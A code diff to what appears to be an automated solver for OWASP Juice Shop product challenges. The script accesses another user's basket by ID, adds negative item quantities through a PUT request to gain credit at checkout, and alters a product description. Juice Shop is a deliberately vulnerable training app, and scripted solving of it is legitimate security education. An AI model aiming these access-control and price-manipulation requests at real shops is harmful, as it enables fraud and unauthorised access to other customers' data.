@@ -16,7 +16,7 @@ def _build_basket_payload(productid, basketid, quantity):
 
 
 def search_products(server, session, searchterm=''):
-    search = session.get('{}/rest/product/search?q={}'.format(server, searchterm))
+    search = session.get('{}/rest/products/search?q={}'.format(server, searchterm))
     if not search.ok:
         raise RuntimeError('Error searching products: {}'.format(search.reason))
     return search.json().get('data')
@@ -28,6 +28,7 @@ def access_another_user_basket(server, session):
     :param server: juice shop URL
     :param session: Session
     """
+    print("Access another user basket...", end="")
     myid = get_current_user_id(server, session)
     if myid is 1:
         targetid = myid + 1
@@ -36,6 +37,8 @@ def access_another_user_basket(server, session):
     basket = session.get('{}/{}'.format(_get_basket_url(server), targetid))
     if not basket.ok:
         raise RuntimeError('Error accessing basket {}'.format(targetid))
+    else:
+        print('Success.')
 
 
 def order_christmas_special(server, session):
@@ -49,6 +52,7 @@ def order_christmas_special(server, session):
         if 'Christmas' in product.get('name'):
             basketid = get_current_user_id(server, session)
             payload = _build_basket_payload(product.get('id'), basketid, 1)
+            print("DEBUG: ", payload)
             _add_to_basket(server, session, payload)
             _checkout(server, session, basketid)
 
@@ -59,12 +63,16 @@ def make_ourselves_rich(server, session):
     :param server: juice shop URL
     :param session: Session
     """
-    print('Adding negative items to basket...'),
+    print('Adding negative items to basket...', end=""),
     basketid = get_current_user_id(server, session)
-    payload = _build_basket_payload(12, basketid, -999)
-    _add_to_basket(server, session, payload)
+    payload = json.dumps({"quantity":-100})
+    basketurl = '{}/api/BasketItems/1'.format(server)
+    additem = session.put(basketurl, data=payload)
+    if not additem.ok:
+        raise RuntimeError('Error adding items to basket.')
+    else:
+      print('Success.')
     _checkout(server, session, basketid)
-    print('Success.')
 
 
 def update_osaft_description(server, session):
@@ -73,9 +81,9 @@ def update_osaft_description(server, session):
     :param server: juice shop URL
     :param session: Session
     """
-    print('Updating O-Saft description with new URL...'),
-    origurl = 'https://www.owasp.org/index.php/O-Saft'
-    newurl = 'http://kimminich.de'
+    print('Updating O-Saft description with new URL...', end=""),
+    origurl = 'http://kimminich.de'
+    newurl = 'https://owasp.slack.com'
     osaft = search_products(server, session, searchterm='O-Saft')[0]
     description = osaft.get('description').replace(origurl, newurl)
     _update_description(server, session, productid=osaft.get('id'), description=description)
@@ -131,8 +139,9 @@ def _add_to_basket(server, session, payload):
     :param session: Session
     :param payload: dict of ProductId, BasketId and quantity to add
     """
-    basketurl = '{}/api/BasketItems'.format(server)
-    additem = session.post(basketurl, headers={'Content-Type': 'application/json'}, data=payload)
+    basketurl = '{}/api/BasketItems/'.format(server)
+    additem = session.post(basketurl, data=payload)
+    # additem = session.post(basketurl, headers={'Content-Type': 'application/json'}, data=payload)
     if not additem.ok:
         raise RuntimeError('Error adding items to basket.')
 
@@ -143,7 +152,8 @@ def _checkout(server, session, basketid):
     :param server: juice shop URL
     :param session: Session
     """
-    checkout = session.post('{}/{}/checkout'.format(_get_basket_url(server), basketid))
+    payload = json.dumps({'couponData':'bnVsbA==','orderDetails':{'paymentId':'3','addressId':'3','deliveryMethodId':'1'}})
+    checkout = session.post('{}/{}/checkout'.format(_get_basket_url(server), basketid), payload)
     if not checkout.ok:
         raise RuntimeError('Error checking out basket.')
 
@@ -162,11 +172,11 @@ def solve_product_challenges(server):
     print('\n== PRODUCT CHALLENGES ==\n')
     session = get_admin_session(server)
     access_another_user_basket(server, session)
-    order_christmas_special(server, session)
-    make_ourselves_rich(server, session)
+    #order_christmas_special(server, session)
+    #make_ourselves_rich(server, session)
     update_osaft_description(server, session)
-    update_product_with_xss3_payload(server, session)
-    forge_coupon(server)
+    #update_product_with_xss3_payload(server, session)
+    #forge_coupon(server)
     print('\n== PRODUCT CHALLENGES COMPLETE ==\n')
 
 if __name__ == '__main__':
